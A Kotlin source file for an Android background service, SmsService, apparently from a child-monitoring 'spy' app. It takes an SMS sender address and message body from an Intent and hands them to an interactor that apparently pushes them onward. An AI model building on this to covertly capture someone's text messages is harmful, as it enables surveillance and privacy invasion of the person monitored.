package sammy.mutahi.gicheru.childSpyApp.services.sms

import android.content.Intent
import sammy.mutahi.gicheru.childSpyApp.services.base.BaseService
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.SMS_ADDRESS
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.SMS_BODY
import javax.inject.Inject


class SmsService : BaseService(), InterfaceServiceSms {

    @Inject
    lateinit var interactor: InterfaceInteractorSms<InterfaceServiceSms>

    override fun onCreate() {
        super.onCreate()
        if (getComponent() != null) {
            getComponent()!!.inject(this)
            interactor.onAttach(this)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent != null) intent.setSmsIntent()
        return super.onStartCommand(intent, flags, startId)
    }

    private fun Intent.setSmsIntent() {
        interactor.setPushSms(getStringExtra(SMS_ADDRESS), getStringExtra(SMS_BODY))
    }

    override fun stopServiceSms() {
        stopSelf()
    }

    override fun onDestroy() {
        interactor.onDetach()
        super.onDestroy()
    }


}